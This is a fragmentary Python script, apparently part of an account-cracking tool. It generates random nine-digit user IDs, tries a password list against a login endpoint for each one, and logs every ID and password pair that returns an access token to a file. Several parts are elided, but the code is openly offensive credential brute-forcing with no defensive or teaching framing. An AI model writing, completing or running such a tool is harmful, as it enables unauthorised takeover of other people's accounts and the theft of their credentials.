...
def Crack_xnxx():
    ...
    for a in range(limit):
        HASMI = "".join(random.choice(string.digits) for _ in range(9))
        user.append(HASMI)
...
def Mathod_fuck(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rHASMI [{loop}] | OK: [{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in response:
                print(f"\r\rH_A_S_M_I-OK | {ids} • {pas}")
                with open("HASMI-OK.txt", "a") as f:
                    f.write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
